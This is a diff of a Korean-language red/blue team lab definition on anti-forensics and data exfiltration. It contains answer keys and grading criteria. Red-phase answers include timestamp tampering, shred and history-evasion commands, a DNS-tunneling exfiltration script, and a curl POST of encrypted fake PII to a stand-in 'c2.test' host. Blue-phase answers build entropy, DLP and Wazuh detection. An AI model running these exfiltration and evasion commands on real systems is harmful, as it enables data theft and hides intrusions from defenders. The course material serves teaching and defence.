@@ -3,8 +3,9 @@ title: 안티포렌식과 데이터 유출 — 은닉과 탐지의 대결
 version: non-ai
 course: battle-adv-nonai
 week: 5
-description: 안티포렌식(Anti-Forensics) 기법과 데이터 유출(Exfiltration) 기법을 분석한다. Red Phase에서 로그 삭제, 타임스탬프 조작, 멀티채널
-  유출을 시뮬레이션하고, Blue Phase에서 DLP 규칙, 엔트로피 분석, NetFlow 기반 탐지를 구현한다.
+description: 안티포렌식(Anti-Forensics) 기법과 데이터 유출(Exfiltration) 기법을 분석한다. Red Phase에서
+  로그 삭제, 타임스탬프 조작, 멀티채널 유출을 시뮬레이션하고, Blue Phase에서 DLP 규칙, 엔트로피 분석, NetFlow 기반 탐지를
+  구현한다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -25,19 +26,23 @@ steps:
   hint: Python 스크립트로 가짜 PII 데이터를 CSV 형식으로 생성한다.
   category: recon
   points: 10
-  answer: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w') as f:\n    f.write('name,email,card_number,ssn\\\
-    n')\n    for i in range(100):\n        name = f'User_{i:03d}'\n        email = f'user{i}@example.com'\n\
-    \        card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n        ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
-    \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake records')\n\" && wc\
-    \ -l /tmp/sensitive_data.csv"
-  answer_detail: 데이터 유출 실습을 위해 가짜 PII를 생성한다. 형식은 실제와 동일하지만 가짜인 데이터를 사용하며, 카드번호(16자리)와 SSN(XXX-XX-XXXX)
-    형식은 DLP 규칙 테스트에 활용된다.
+  answer: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w')\
+    \ as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n\
+    \        name = f'User_{i:03d}'\n        email = f'user{i}@example.com'\n    \
+    \    card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n   \
+    \     ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
+    \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake\
+    \ records')\n\" && wc -l /tmp/sensitive_data.csv"
+  answer_detail: 데이터 유출 실습을 위해 가짜 PII를 생성한다. 형식은 실제와 동일하지만 가짜인 데이터를 사용하며, 카드번호(16자리)와
+    SSN(XXX-XX-XXXX) 형식은 DLP 규칙 테스트에 활용된다.
   verify:
     type: output_contains
-    expect: 100 fake records
+    expect:
+    - 100 fake records
+    - csv
     semantic:
-      intent: '[RED] 가짜 PII 생성 — Python: 100건 name/email/4XXX 카드/SSN XXX-XX-XXXX > /tmp/sensitive_data.csv.
-        DLP 규칙 테스트. PCI-DSS 패턴 형식. 교육용 가짜 데이터.'
+      intent: '[RED] 가짜 PII 생성 — Python: 100건 name/email/4XXX 카드/SSN XXX-XX-XXXX >
+        /tmp/sensitive_data.csv. DLP 규칙 테스트. PCI-DSS 패턴 형식. 교육용 가짜 데이터.'
       success_criteria:
       - 100 fake records 키워드
       - name + email + card + ssn 4필드
@@ -52,23 +57,26 @@ steps:
       - CSV 아님
   target_vm: attacker
 - order: 2
-  instruction: '[RED] 안티포렌식 기법을 시뮬레이션하라. 타임스탬프 조작(touch -t), 로그 삭제 흔적 생성, 파일 시큐어 삭제를 실습하라. (시뮬레이션 파일에
-    대해서만 수행)'
+  instruction: '[RED] 안티포렌식 기법을 시뮬레이션하라. 타임스탬프 조작(touch -t), 로그 삭제 흔적 생성, 파일 시큐어 삭제를
+    실습하라. (시뮬레이션 파일에 대해서만 수행)'
   hint: touch -t로 타임스탬프를 변경하고, shred로 시큐어 삭제를 시뮬레이션한다.
   category: exploit
   points: 10
-  answer: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt && stat
-    /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01 ---" && echo "Log
-    deletion simulation:" && echo "shred -vfz -n 5 /tmp/af_test.txt (would securely delete)" && echo "History
-    evasion: export HISTFILE=/dev/null" && echo "Anti-forensic techniques documented (T1070)"'
-  answer_detail: 안티포렌식(T1070)은 공격 흔적을 제거하는 기법이다. touch -t로 타임스탬프를 조작하여 타임라인 분석을 방해하고, shred로 파일을 복구 불가능하게
-    삭제한다. HISTFILE=/dev/null로 명령 기록을 남기지 않는다.
+  answer: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt
+    && stat /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01
+    ---" && echo "Log deletion simulation:" && echo "shred -vfz -n 5 /tmp/af_test.txt
+    (would securely delete)" && echo "History evasion: export HISTFILE=/dev/null"
+    && echo "Anti-forensic techniques documented (T1070)"'
+  answer_detail: 안티포렌식(T1070)은 공격 흔적을 제거하는 기법이다. touch -t로 타임스탬프를 조작하여 타임라인 분석을 방해하고,
+    shred로 파일을 복구 불가능하게 삭제한다. HISTFILE=/dev/null로 명령 기록을 남기지 않는다.
   verify:
     type: output_contains
-    expect: anti-forensic
+    expect:
+    - anti-forensic
+    - shred
     semantic:
-      intent: '[RED] 안티포렌식 — touch -t 202301010000 (timestomp) + shred -vfz -n 5 + HISTFILE=/dev/null.
-        MITRE T1070.006/001/003. 타임라인/로그/히스토리 3대 공격.'
+      intent: '[RED] 안티포렌식 — touch -t 202301010000 (timestomp) + shred -vfz -n 5 +
+        HISTFILE=/dev/null. MITRE T1070.006/001/003. 타임라인/로그/히스토리 3대 공격.'
       success_criteria:
       - anti-forensic 키워드
       - touch -t + shred + HISTFILE
@@ -83,24 +91,26 @@ steps:
       - T1070 맥락 없음
   target_vm: attacker
 - order: 3
-  instruction: '[RED] DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS 쿼리에 포함시키는 스크립트를 작성하라.'
+  instruction: '[RED] DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS 쿼리에
+    포함시키는 스크립트를 작성하라.'
   hint: 데이터를 50바이트 청크로 분할하여 서브도메인에 포함한다.
   category: exploit
   points: 10
-  answer: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv |\
-    \ base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation ===\"\necho\
-    \ \"Total encoded size: ${#DATA} bytes\"\nwhile [ ${#DATA} -gt 0 ]; do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n\
-    \    DATA=${DATA:$CHUNK_SIZE}\n    echo \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\
-    \n    SEQ=$((SEQ + 1))\n    if [ $SEQ -ge 5 ]; then echo \"... (truncated)\"; break; fi\ndone\nSCRIPT\n\
-    bash /tmp/dns_exfil.sh"
-  answer_detail: DNS Exfiltration(T1048.001)은 DNS 프로토콜을 데이터 전송 채널로 악용한다. 거의 모든 네트워크에서 DNS가 허용되므로 방화벽 우회에
-    효과적이다.
+  answer: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv\
+    \ | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation\
+    \ ===\"\necho \"Total encoded size: ${#DATA} bytes\"\nwhile [ ${#DATA} -gt 0 ];\
+    \ do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo\
+    \ \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n    SEQ=$((SEQ\
+    \ + 1))\n    if [ $SEQ -ge 5 ]; then echo \"... (truncated)\"; break; fi\ndone\n\
+    SCRIPT\nbash /tmp/dns_exfil.sh"
+  answer_detail: DNS Exfiltration(T1048.001)은 DNS 프로토콜을 데이터 전송 채널로 악용한다. 거의 모든 네트워크에서
+    DNS가 허용되므로 방화벽 우회에 효과적이다.
   verify:
     type: output_contains
     expect: DNS Exfiltration
     semantic:
-      intent: '[RED] DNS 유출 시뮬 — base64 + 50바이트 청크 + ${CHUNK}.seq${SEQ}.exfil.test.local. DNS 쿼리로 데이터
-        전송. 방화벽 DNS 허용 → 우회 효과. MITRE T1048.001.'
+      intent: '[RED] DNS 유출 시뮬 — base64 + 50바이트 청크 + ${CHUNK}.seq${SEQ}.exfil.test.local.
+        DNS 쿼리로 데이터 전송. 방화벽 DNS 허용 → 우회 효과. MITRE T1048.001.'
       success_criteria:
       - DNS Exfiltration 키워드
       - base64 + 50바이트 청크
@@ -115,24 +125,26 @@ steps:
       - DNS 맥락 없음
   target_vm: attacker
 - order: 4
-  instruction: '[RED] HTTPS와 ICMP를 이용한 멀티채널 유출을 시뮬레이션하라. 데이터를 암호화하여 HTTPS POST에 포함하고, ICMP 페이로드에도 은닉하라.'
+  instruction: '[RED] HTTPS와 ICMP를 이용한 멀티채널 유출을 시뮬레이션하라. 데이터를 암호화하여 HTTPS POST에 포함하고,
+    ICMP 페이로드에도 은닉하라.'
   hint: openssl로 암호화하고 curl로 POST, ping -p로 ICMP 데이터를 전송한다.
   category: exploit
   points: 10
-  answer: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc -aes-256-cbc -salt -in
-    /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null &&
-    echo "=== Multi-Channel Exfiltration ===" && echo "Channel 1 - HTTPS: curl -X POST https://c2.test/upload
-    -F file=@/tmp/exfil_encrypted.bin" && echo "Channel 2 - ICMP:" && echo -n "EXFIL_TEST" | xxd -p |
-    head -c 32 > /tmp/icmp_payload.txt && ping -c 1 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1 |
-    head -3 && echo "Multi-channel exfiltration simulated"'
-  answer_detail: 멀티채널 유출은 데이터를 분할하여 여러 프로토콜로 동시에 전송한다. HTTPS(암호화), ICMP(간과되기 쉬움)를 조합하면 단일 채널 차단으로 유출을
-    완전히 막을 수 없다.
+  answer: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc
+    -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass
+    pass:ExfilKey2026 -pbkdf2 2>/dev/null && echo "=== Multi-Channel Exfiltration
+    ===" && echo "Channel 1 - HTTPS: curl -X POST https://c2.test/upload -F file=@/tmp/exfil_encrypted.bin"
+    && echo "Channel 2 - ICMP:" && echo -n "EXFIL_TEST" | xxd -p | head -c 32 > /tmp/icmp_payload.txt
+    && ping -c 1 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1 | head -3 && echo
+    "Multi-channel exfiltration simulated"'
+  answer_detail: 멀티채널 유출은 데이터를 분할하여 여러 프로토콜로 동시에 전송한다. HTTPS(암호화), ICMP(간과되기 쉬움)를
+    조합하면 단일 채널 차단으로 유출을 완전히 막을 수 없다.
   verify:
     type: output_contains
     expect: Multi-Channel
     semantic:
-      intent: '[RED] 멀티채널 유출 — gzip + openssl AES-256-CBC + curl -X POST https + ping -p ICMP. HTTPS(암호화)
-        + ICMP(간과) 조합. 단일 차단 무력. MITRE T1048.'
+      intent: '[RED] 멀티채널 유출 — gzip + openssl AES-256-CBC + curl -X POST https + ping
+        -p ICMP. HTTPS(암호화) + ICMP(간과) 조합. 단일 차단 무력. MITRE T1048.'
       success_criteria:
       - Multi-Channel 키워드
       - gzip + openssl + curl + ping 4단계
@@ -147,27 +159,29 @@ steps:
       - 멀티 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: '[BLUE] Phase 전환 — DNS 유출을 탐지하기 위한 Shannon 엔트로피 분석 스크립트를 작성하라. 엔트로피 3.5 이상이고 길이 30 이상인
-    쿼리를 의심 대상으로 판정하라.'
+  instruction: '[BLUE] Phase 전환 — DNS 유출을 탐지하기 위한 Shannon 엔트로피 분석 스크립트를 작성하라. 엔트로피
+    3.5 이상이고 길이 30 이상인 쿼리를 의심 대상으로 판정하라.'
   hint: Python으로 Shannon 엔트로피를 계산하고 정상/비정상 쿼리를 비교한다.
   category: defense
   points: 10
-  answer: "python3 -c \"\nimport math\nfrom collections import Counter\ndef shannon_entropy(s):\n    freq\
-    \ = Counter(s)\n    length = len(s)\n    return -sum((count/length) * math.log2(count/length) for\
-    \ count in freq.values())\nqueries = [\n    'www.google.com',\n    'mail.example.org',\n    'U2VjcmV0X0V4Zml.seq0.exfil.test.local',\n\
-    \    'YWJjZGVmZ2hpamts.seq2.exfil.test.local',\n    'update.microsoft.com',\n]\nprint('=== DNS Exfiltration\
-    \ Detection via Entropy ===')\nprint(f'{chr(34)+\"Query\"+chr(34):<50} {\"Length\":>6} {\"Entropy\"\
-    :>8} {\"Suspicious\":>10}')\nfor q in queries:\n    e = shannon_entropy(q.split('.')[0])\n    l =\
-    \ len(q)\n    suspicious = 'YES' if e > 3.5 and l > 30 else 'NO'\n    print(f'{q:<50} {l:>6} {e:>8.2f}\
-    \ {suspicious:>10}')\nprint('Threshold: Entropy > 3.5 AND Length > 30')\n\""
-  answer_detail: 정상 도메인은 엔트로피가 낮고(~2.5), base64 인코딩된 유출 쿼리는 엔트로피가 높다(>3.5). 쿼리 길이와 엔트로피를 결합하면 DNS 터널링을
-    높은 정확도로 탐지할 수 있다.
+  answer: "python3 -c \"\nimport math\nfrom collections import Counter\ndef shannon_entropy(s):\n\
+    \    freq = Counter(s)\n    length = len(s)\n    return -sum((count/length) *\
+    \ math.log2(count/length) for count in freq.values())\nqueries = [\n    'www.google.com',\n\
+    \    'mail.example.org',\n    'U2VjcmV0X0V4Zml.seq0.exfil.test.local',\n    'YWJjZGVmZ2hpamts.seq2.exfil.test.local',\n\
+    \    'update.microsoft.com',\n]\nprint('=== DNS Exfiltration Detection via Entropy\
+    \ ===')\nprint(f'{chr(34)+\"Query\"+chr(34):<50} {\"Length\":>6} {\"Entropy\"\
+    :>8} {\"Suspicious\":>10}')\nfor q in queries:\n    e = shannon_entropy(q.split('.')[0])\n\
+    \    l = len(q)\n    suspicious = 'YES' if e > 3.5 and l > 30 else 'NO'\n    print(f'{q:<50}\
+    \ {l:>6} {e:>8.2f} {suspicious:>10}')\nprint('Threshold: Entropy > 3.5 AND Length\
+    \ > 30')\n\""
+  answer_detail: 정상 도메인은 엔트로피가 낮고(~2.5), base64 인코딩된 유출 쿼리는 엔트로피가 높다(>3.5). 쿼리 길이와
+    엔트로피를 결합하면 DNS 터널링을 높은 정확도로 탐지할 수 있다.
   verify:
     type: output_contains
     expect: DNS Exfiltration Detection
     semantic:
-      intent: '[BLUE] Shannon 엔트로피 탐지 — Python math.log2 + Counter. 엔트로피 > 3.5 + 길이 > 30 = 의심. 정상 ~2.5
-        vs base64 ~4+. DNS 터널링 탐지 정확도↑.'
+      intent: '[BLUE] Shannon 엔트로피 탐지 — Python math.log2 + Counter. 엔트로피 > 3.5 + 길이
+        > 30 = 의심. 정상 ~2.5 vs base64 ~4+. DNS 터널링 탐지 정확도↑.'
       success_criteria:
       - DNS Exfiltration Detection 키워드
       - shannon_entropy 함수
@@ -182,27 +196,31 @@ steps:
       - 임계값 없음
   target_vm: secu
 - order: 6
-  instruction: '[BLUE] DLP(Data Loss Prevention) 규칙을 작성하라. 신용카드 번호, SSN, 이메일 대량 전송을 탐지하는 정규식 기반 DLP 규칙을
-    구현하라.'
+  instruction: '[BLUE] DLP(Data Loss Prevention) 규칙을 작성하라. 신용카드 번호, SSN, 이메일 대량 전송을
+    탐지하는 정규식 기반 DLP 규칙을 구현하라.'
   hint: 정규식으로 PII 패턴을 정의하고 임계값을 설정한다.
   category: defense
   points: 10
   answer: "python3 -c \"\nimport re\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\\
-    b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk': r'[\\w.+-]+@[\\w-]+\\.[\\w.-]+',\n\
-    }\nwith open('/tmp/sensitive_data.csv') as f:\n    content = f.read()\nprint('=== DLP Rule Analysis\
-    \ ===')\nfor name, pattern in rules.items():\n    matches = re.findall(pattern, content)\n    severity\
-    \ = 'CRITICAL' if len(matches) > 10 else 'WARNING' if len(matches) > 0 else 'OK'\n    print(f'Rule:\
-    \ {name:<15} Matches: {len(matches):>5}  Severity: {severity}')\n    if matches:\n        print(f'\
-    \  Sample: {matches[0]}')\nprint('DLP Action: BLOCK transfer - 100+ PII records detected')\n\""
-  answer_detail: DLP는 정규식으로 민감 데이터(PII)를 식별하고 유출을 차단한다. 카드번호, SSN, 이메일 패턴을 매칭하고 임계값 초과 시 전송을 차단한다.
+    b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk': r'[\\w.+-]+@[\\\
+    w-]+\\.[\\w.-]+',\n}\nwith open('/tmp/sensitive_data.csv') as f:\n    content\
+    \ = f.read()\nprint('=== DLP Rule Analysis ===')\nfor name, pattern in rules.items():\n\
+    \    matches = re.findall(pattern, content)\n    severity = 'CRITICAL' if len(matches)\
+    \ > 10 else 'WARNING' if len(matches) > 0 else 'OK'\n    print(f'Rule: {name:<15}\
+    \ Matches: {len(matches):>5}  Severity: {severity}')\n    if matches:\n      \
+    \  print(f'  Sample: {matches[0]}')\nprint('DLP Action: BLOCK transfer - 100+\
+    \ PII records detected')\n\""
+  answer_detail: DLP는 정규식으로 민감 데이터(PII)를 식별하고 유출을 차단한다. 카드번호, SSN, 이메일 패턴을 매칭하고 임계값
+    초과 시 전송을 차단한다.
   verify:
     type: output_contains
     expect:
     - DLP Rule Analysis
     - Regex
     semantic:
-      intent: '[BLUE] DLP 규칙 — Python re: credit_card (4XXX-XXXX-XXXX-XXXX | 51-55XX) + ssn (XXX-XX-XXXX)
-        + email_bulk. 임계 >10 = CRITICAL. 정규식 기반 PII 탐지. PCI-DSS + GDPR 준수.'
+      intent: '[BLUE] DLP 규칙 — Python re: credit_card (4XXX-XXXX-XXXX-XXXX | 51-55XX)
+        + ssn (XXX-XX-XXXX) + email_bulk. 임계 >10 = CRITICAL. 정규식 기반 PII 탐지. PCI-DSS
+        + GDPR 준수.'
       success_criteria:
       - DLP Rule Analysis 또는 Regex 키워드
       - 3종 정규식 (card/ssn/email)
@@ -217,27 +235,31 @@ steps:
       - PCI 맥락 없음
   target_vm: secu
 - order: 7
-  instruction: '[BLUE] Wazuh에서 데이터 유출 시도를 탐지하는 규칙을 작성하라. 대량 파일 접근, DNS 터널링, USB 장치 연결을 탐지하고 상관 분석하라.'
+  instruction: '[BLUE] Wazuh에서 데이터 유출 시도를 탐지하는 규칙을 작성하라. 대량 파일 접근, DNS 터널링, USB 장치
+    연결을 탐지하고 상관 분석하라.'
   hint: Wazuh 규칙 XML 형식으로 작성한다.
   category: defense
   points: 10
-  answer: "\U0001F5A5️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인\n\U0001F4CE 참고 (CLI): cat\
-    \ > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\">\n  <rule id=\"100300\" level=\"\
-    12\" frequency=\"50\" timeframe=\"300\">\n    <if_sid>554</if_sid>\n    <match>open|read</match>\n\
-    \    <description>Mass file access: 50+ reads in 5 min (data staging)</description>\n    <mitre><id>T1005</id></mitre>\n\
-    \  </rule>\n  <rule id=\"100301\" level=\"12\">\n    <if_group>syslog</if_group>\n    <match>DNS_TUNNEL|dns_tunnel|high_entropy</match>\n\
-    \    <description>DNS tunneling activity detected</description>\n    <mitre><id>T1048.001</id></mitre>\n\
-    \  </rule>\n  <rule id=\"100302\" level=\"14\" frequency=\"3\" timeframe=\"600\">\n    <if_matched_group>data_exfiltration</if_matched_group>\n\
-    \    <description>CRITICAL: Multiple exfiltration indicators in 10 min</description>\n  </rule>\n\
-    </group>\nEOF\ncat /tmp/wazuh_dlp_rules.xml"
-  answer_detail: Wazuh DLP 규칙은 대량 파일 접근(T1005), DNS 터널링(T1048.001)을 개별 탐지하고, 상관 규칙으로 10분 내 3개 이상 지표 발생
-    시 CRITICAL 알림을 발생시킨다.
+  answer: "\U0001F5A5️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인\n\U0001F4CE\
+    \ 참고 (CLI): cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\"\
+    >\n  <rule id=\"100300\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n  \
+    \  <if_sid>554</if_sid>\n    <match>open|read</match>\n    <description>Mass file\
+    \ access: 50+ reads in 5 min (data staging)</description>\n    <mitre><id>T1005</id></mitre>\n\
+    \  </rule>\n  <rule id=\"100301\" level=\"12\">\n    <if_group>syslog</if_group>\n\
+    \    <match>DNS_TUNNEL|dns_tunnel|high_entropy</match>\n    <description>DNS tunneling\
+    \ activity detected</description>\n    <mitre><id>T1048.001</id></mitre>\n  </rule>\n\
+    \  <rule id=\"100302\" level=\"14\" frequency=\"3\" timeframe=\"600\">\n    <if_matched_group>data_exfiltration</if_matched_group>\n\
+    \    <description>CRITICAL: Multiple exfiltration indicators in 10 min</description>\n\
+    \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_dlp_rules.xml"
+  answer_detail: Wazuh DLP 규칙은 대량 파일 접근(T1005), DNS 터널링(T1048.001)을 개별 탐지하고, 상관 규칙으로
+    10분 내 3개 이상 지표 발생 시 CRITICAL 알림을 발생시킨다.
   verify:
     type: output_contains
     expect: data_exfiltration
     semantic:
-      intent: '[BLUE] Wazuh DLP 룰 — 100300 대량 파일 접근(>50/5min, T1005) + 100301 DNS 터널링(T1048.001) + 100302
-        상관(3지표/10min, CRITICAL). 다단계 유출 탐지. Wazuh composite rule.'
+      intent: '[BLUE] Wazuh DLP 룰 — 100300 대량 파일 접근(>50/5min, T1005) + 100301 DNS
+        터널링(T1048.001) + 100302 상관(3지표/10min, CRITICAL). 다단계 유출 탐지. Wazuh composite
+        rule.'
       success_criteria:
       - data_exfiltration 키워드
       - 3 룰 (대량 파일/DNS/상관)
@@ -252,30 +274,36 @@ steps:
       - 상관 규칙 없음
   target_vm: siem
 - order: 8
-  instruction: '[RED/BLUE] 환경을 정리하고 데이터 유출 평가 보고서를 작성하라. 유출 채널별 대역폭, 탐지 난이도, 방어 권장책을 포함하라.'
+  instruction: '[RED/BLUE] 환경을 정리하고 데이터 유출 평가 보고서를 작성하라. 유출 채널별 대역폭, 탐지 난이도, 방어 권장책을
+    포함하라.'
   hint: DNS, HTTPS, ICMP 각 채널의 특성을 비교하고, 안티포렌식 대응책을 정리한다.
   category: analysis
   points: 15
-  answer: "rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin /tmp/icmp_*.txt\
-    \ /tmp/af_test.txt 2>/dev/null && cat > /tmp/exfil_report.txt << 'EOF'\n=== Data Exfiltration & Anti-Forensics\
-    \ Assessment ===\nDate: 2026-04-06 | Scope: 10.20.30.0/24\n\n1. Exfiltration Channels:\n   | Channel\
-    \ | Bandwidth | Stealth | Detection Method |\n   |---------|-----------|---------|------------------|\n\
-    \   | DNS | ~50B/query | High | Entropy analysis |\n   | HTTPS | ~1MB/req | Very High | TLS inspection\
-    \ |\n   | ICMP | ~64B/pkt | Medium | Payload inspection |\n\n2. Anti-Forensics Tested:\n   - Timestamp\
-    \ manipulation (T1070.006) -> Detect: FIM, auditd\n   - Log deletion (T1070.001) -> Detect: Remote\
-    \ log shipping\n   - History evasion (T1070.003) -> Detect: auditd process monitoring\n\n3. Key Findings:\n\
-    \   [C-01] No DLP controls on any channel\n   [C-02] DNS queries not filtered or analyzed\n   [H-01]\
-    \ No remote log backup (single point of failure)\n\n4. Recommendations:\n   - Deploy DNS entropy monitoring\n\
-    \   - Implement remote syslog to SIEM\n   - Enable auditd on all servers\n   - Deploy Network DLP\
-    \ at perimeter\n\nMITRE ATT&CK: T1048.001, T1048.002, T1048.003, T1070, T1005\nEOF\ncat /tmp/exfil_report.txt"
-  answer_detail: 보고서는 유출 채널별 특성, 안티포렌식 기법별 대응, 발견 사항, 권고사항을 포함한다. DLP 부재와 DNS 모니터링 미적용이 가장 심각한 Gap이다.
+  answer: "rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin\
+    \ /tmp/icmp_*.txt /tmp/af_test.txt 2>/dev/null && cat > /tmp/exfil_report.txt\
+    \ << 'EOF'\n=== Data Exfiltration & Anti-Forensics Assessment ===\nDate: 2026-04-06\
+    \ | Scope: 10.20.30.0/24\n\n1. Exfiltration Channels:\n   | Channel | Bandwidth\
+    \ | Stealth | Detection Method |\n   |---------|-----------|---------|------------------|\n\
+    \   | DNS | ~50B/query | High | Entropy analysis |\n   | HTTPS | ~1MB/req | Very\
+    \ High | TLS inspection |\n   | ICMP | ~64B/pkt | Medium | Payload inspection\
+    \ |\n\n2. Anti-Forensics Tested:\n   - Timestamp manipulation (T1070.006) -> Detect:\
+    \ FIM, auditd\n   - Log deletion (T1070.001) -> Detect: Remote log shipping\n\
+    \   - History evasion (T1070.003) -> Detect: auditd process monitoring\n\n3. Key\
+    \ Findings:\n   [C-01] No DLP controls on any channel\n   [C-02] DNS queries not\
+    \ filtered or analyzed\n   [H-01] No remote log backup (single point of failure)\n\
+    \n4. Recommendations:\n   - Deploy DNS entropy monitoring\n   - Implement remote\
+    \ syslog to SIEM\n   - Enable auditd on all servers\n   - Deploy Network DLP at\
+    \ perimeter\n\nMITRE ATT&CK: T1048.001, T1048.002, T1048.003, T1070, T1005\nEOF\n\
+    cat /tmp/exfil_report.txt"
+  answer_detail: 보고서는 유출 채널별 특성, 안티포렌식 기법별 대응, 발견 사항, 권고사항을 포함한다. DLP 부재와 DNS 모니터링
+    미적용이 가장 심각한 Gap이다.
   verify:
     type: output_contains
     expect: Exfiltration & Anti-Forensics
     semantic:
-      intent: '[RED/BLUE] 유출 + 안티포렌식 보고서 — echo > /tmp/exfil_report.txt: 3 채널 (DNS 50B/high + HTTPS 1MB/very
-        high + ICMP 64B/medium) + 안티포렌식 3기법 + Findings (C-01 DLP 없음/C-02 DNS 필터 없음/H-01 로그 백업 없음). MITRE
-        T1070/T1048.'
+      intent: '[RED/BLUE] 유출 + 안티포렌식 보고서 — echo > /tmp/exfil_report.txt: 3 채널 (DNS
+        50B/high + HTTPS 1MB/very high + ICMP 64B/medium) + 안티포렌식 3기법 + Findings (C-01
+        DLP 없음/C-02 DNS 필터 없음/H-01 로그 백업 없음). MITRE T1070/T1048.'
       success_criteria:
       - Data Exfiltration & Anti-Forensics 키워드
       - 채널 비교 표 + Findings
